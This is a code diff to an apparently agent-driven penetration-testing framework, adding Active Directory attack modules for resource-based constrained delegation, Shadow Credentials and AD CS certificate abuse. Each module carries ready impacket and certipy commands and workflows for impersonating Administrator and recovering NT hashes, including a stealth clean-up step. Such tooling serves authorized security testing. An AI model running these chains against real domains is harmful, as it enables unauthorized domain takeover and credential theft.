@@ -215,3 +215,171 @@ class SMBSigningCheck(AttackModule):
                 "3. If signing IS required -> relay attacks will fail; pivot to Kerberoasting / AS-REP roasting / PtH instead.",
             ],
         )
+
+
+class RBCDAttack(AttackModule):
+    name = "RBCDAttack"
+    description = (
+        "Resource-Based Constrained Delegation: abuse GenericWrite/WriteOwner on a computer object "
+        "to configure msDS-AllowedToActOnBehalfOfOtherIdentity, then impersonate any domain user "
+        "(impacket rbcd + getST)"
+    )
+    target_services = ["ldap", "kerberos", "microsoft-ds"]
+    target_ports = [389, 636, 3268, 88, 445]
+    required_cves: list[str] = []
+    # Capability metadata: RBCD needs a controlled principal (owned machine
+    # account via MachineAccountQuota, or an existing account we have creds
+    # for) plus GenericWrite/WriteOwner on the target computer (found via
+    # BloodHoundCollect). Impersonating a domain admin yields admin-equivalent
+    # access; the forged service ticket is a credential artifact.
+    requires: list[str] = ["credentials"]
+    produces: list[str] = ["credentials", "foothold"]
+    read_only = False
+    cost = "high"
+    phase_hint = "escalate"
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        return self._info_result(
+            ctx,
+            note=(
+                "Abuses resource-based constrained delegation: with write access "
+                "over a computer object, set msDS-AllowedToActOnBehalfOfOtherIdentity "
+                "to a controlled principal, then S4U2self/S4U2proxy (getST) to "
+                "impersonate a privileged user. No domain-admin rights needed -- "
+                "only GenericWrite/WriteOwner on the target computer plus one "
+                "controlled account."
+            ),
+            evidence=[
+                f"RBCD attack planned against {ctx.target_ip} (GenericWrite path + controlled principal required)"
+            ],
+            references=[
+                "https://github.com/fortra/impacket/blob/master/examples/rbcd.py",
+                "https://github.com/fortra/impacket/blob/master/examples/getST.py",
+                "https://www.thehacker.recipes/a-d/persistence/sid-history",
+            ],
+            suggested_command=(
+                f"impacket-rbcd -dc-ip {ctx.target_ip} -t TARGET$ -f CONTROLLED$ 'DOMAIN/user:password' -action write "
+                f"&& impacket-getST -spn cifs/{ctx.target_ip} -impersonate Administrator -dc-ip {ctx.target_ip} 'DOMAIN/CONTROLLED$:password'"
+            ),
+            prerequisites=[
+                "domain credentials (any low-priv user suffices to start)",
+                "GenericWrite/WriteOwner/GenericAll on the target computer (find via BloodHoundCollect)",
+                "a controlled principal: existing owned account, or a new machine account (MachineAccountQuota > 0)",
+            ],
+            privilege_level="admin",
+            workflow=[
+                "1. Run BloodHoundCollect; query for outbound GenericWrite/WriteOwner/GenericAll edges onto computer objects.",
+                f"2. Secure a controlled principal: reuse an owned account, or add a machine account against {ctx.target_ip} (addcomputer.py when MachineAccountQuota allows).",
+                "3. Write the delegation: impacket-rbcd -action write with -t <target$> -f <controlled$> via run_exploit_terminal (allowlist-locked).",
+                "4. Impersonate: impacket-getST -spn cifs/<target> -impersonate Administrator; export KRB5CCNAME=<ccache>.",
+                "5. Use the ticket: lateral_exec / PassTheHash against the owned target only; cred_store_add any recovered hashes.",
+            ],
+        )
+
+
+class ShadowCredentials(AttackModule):
+    name = "ShadowCredentials"
+    description = (
+        "Shadow Credentials (Key Credentials): abuse GenericWrite on a user/computer object "
+        "to add key credentials, then PKINIT-authenticate as the victim and recover its NT hash "
+        "(certipy shadow / pywhisker)"
+    )
+    target_services = ["ldap", "kerberos"]
+    target_ports = [389, 636, 3268, 3269, 88]
+    required_cves: list[str] = []
+    # Capability metadata: needs GenericWrite/GenericAll on the victim account
+    # (found via BloodHoundCollect) plus any domain credential to bind. Yields
+    # the victim's NT hash -- a credential/hash artifact. Victim choice drives
+    # impact: a DA victim means domain compromise.
+    requires: list[str] = ["credentials"]
+    produces: list[str] = ["hash_artifact", "credentials"]
+    read_only = False
+    cost = "medium"
+    phase_hint = "escalate"
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        return self._info_result(
+            ctx,
+            note=(
+                "Adds attacker-controlled key credentials (msDS-KeyCredentialLink) "
+                "to a victim account you hold GenericWrite over, then authenticates "
+                "via PKINIT (certipy shadow auto) to recover the victim's NT hash. "
+                "Works against users AND computers; no password change, no service "
+                "disruption."
+            ),
+            evidence=[f"shadow-credentials attack planned against {ctx.target_ip} (GenericWrite on victim required)"],
+            references=[
+                "https://github.com/ly4k/Certipy",
+                "https://github.com/eladshamir/Whisker",
+                "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",
+            ],
+            suggested_command=(
+                f"certipy shadow auto -u user@DOMAIN -p password -dc-ip {ctx.target_ip} -target {ctx.target_ip} -account VICTIM"
+            ),
+            prerequisites=[
+                "domain credentials (any low-priv user suffices to start)",
+                "GenericWrite/GenericAll on the victim user/computer (find via BloodHoundCollect)",
+            ],
+            workflow=[
+                "1. Run BloodHoundCollect; query for outbound GenericWrite/GenericAll edges onto high-value users/computers.",
+                f"2. Add key credentials: certipy shadow auto -u <u>@<domain> -p <p> -dc-ip {ctx.target_ip} -account <victim> via run_exploit_terminal (allowlist-locked).",
+                "3. certipy recovers the victim NT hash via PKINIT -- cred_store_add the hash immediately.",
+                "4. PassTheHash / lateral_exec as the victim against the owned target only; remove the key credential afterwards to restore stealth.",
+            ],
+        )
+
+
+class ESCChain(AttackModule):
+    name = "ESCChain"
+    description = (
+        "AD CS enrollment exploitation: turn ADCSEnum ESC2/3/4/6/8 findings into certificates "
+        "via certipy req/auth, then recover NT hashes for pass-the-hash (ESC8 relays via ResponderRelay)"
+    )
+    target_services = ["ldap", "msrpc", "microsoft-ds", "http"]
+    target_ports = [389, 3268, 445, 443]
+    required_cves: list[str] = []
+    # Capability metadata: the execution half of ADCSEnum (which only
+    # enumerates). Needs domain credentials plus a vulnerable template finding
+    # from ADCSEnum. Yields the victim's NT hash -- a credential/hash artifact
+    # feeding PassTheHash / lateral_exec.
+    requires: list[str] = ["credentials"]
+    produces: list[str] = ["credentials", "hash_artifact"]
+    read_only = False
+    cost = "high"
+    phase_hint = "exploit"
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        return self._info_result(
+            ctx,
+            note=(
+                "Executes the enrollment paths ADCSEnum only reports: request a "
+                "certificate as/impersonating the victim (ESC1/2/3/6), re-enroll a "
+                "template you own (ESC4), or relay HTTP enrollment (ESC8), then "
+                "certipy auth to recover the NT hash. ESC8 needs SMB signing OFF "
+                "on the relay target (check via SMBSigningCheck)."
+            ),
+            evidence=[
+                f"ESC enrollment attack planned against {ctx.target_ip} (vulnerable template + domain creds required)"
+            ],
+            references=[
+                "https://github.com/ly4k/Certipy",
+                "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
+            ],
+            suggested_command=(
+                f"certipy req -u user@DOMAIN -p password -dc-ip {ctx.target_ip} -target {ctx.target_ip} "
+                "-ca CA-NAME -template VULN-TEMPLATE -upn victim@domain "
+                f"&& certipy auth -pfx victim.pfx -dc-ip {ctx.target_ip}"
+            ),
+            prerequisites=[
+                "domain credentials (recovered via ASREPRoast / Kerberoasting / credential dump)",
+                "ADCSEnum finding: a vulnerable template (ESC1/2/3/4/6) or an HTTP enrollment endpoint (ESC8)",
+                "ESC8 only: SMB signing disabled on the relay target (SMBSigningCheck)",
+            ],
+            workflow=[
+                f"1. Call adcs_enum(target_ip='{ctx.target_ip}', ...) and classify the vulnerable template (ESC1/2/3/4/6) or HTTP endpoint (ESC8).",
+                "2a. ESC1/2/3/6: certipy req (-upn/-dns as the victim per template) then certipy auth -pfx to recover the NT hash.",
+                "2b. ESC4: rewrite the template as owner, then follow 2a; restore the template afterwards.",
+                "2c. ESC8: start ResponderRelay, coerce HTTP auth to the listener, relay to http(s)://<ca>/certsrv/certfnsh.asp.",
+                "3. cred_store_add the recovered NT hash; PassTheHash / lateral_exec against the owned target only.",
+            ],
+        )
